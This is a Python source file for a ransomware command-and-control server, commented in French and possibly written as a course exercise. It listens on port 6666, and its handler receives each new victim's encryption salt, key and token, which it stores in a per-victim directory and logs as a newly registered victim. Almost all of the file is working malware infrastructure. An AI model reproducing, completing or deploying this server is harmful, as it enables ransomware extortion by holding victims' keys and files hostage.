import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)


    def post_new(self, path: str, params: dict, body: dict) -> dict:
        """
        Enregistre une nouvelle instance de ransomware en enregistrant son sel et sa clé dans un répertoire de la victime.
        Renvoie le statut de la requête (succès ou erreur).
        """
        if body is None:
            # Corps de requête vide
            return {
                "status": "Erreur",
                "message": "Corps de requête vide"
            }


        # Décode la base64
        salt = base64.b64decode(body["salt"])
        key = base64.b64decode(body["key"])
        token = base64.b64decode(body["token"])

        # Calculez le hachage du jeton pour créer un répertoire pour la victime
        hashed_token = sha256(token).hexdigest()
        victim_dir = os.path.join(CNC.ROOT_PATH, hashed_token)
        os.makedirs(victim_dir, exist_ok=True)

        # Enregistrez le sel et la clé dans le répertoire de la victime
        with open(os.path.join(victim_dir, "salt.bin"), "wb") as salt_file:
            salt_file.write(salt)
        with open(os.path.join(victim_dir, "key.bin"), "wb") as key_file:
            key_file.write(key)

        self._log.info(f"Nouvelle victime enregistrée avec son token {hashed_token}")
        return {"status": "Success"}
    



           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()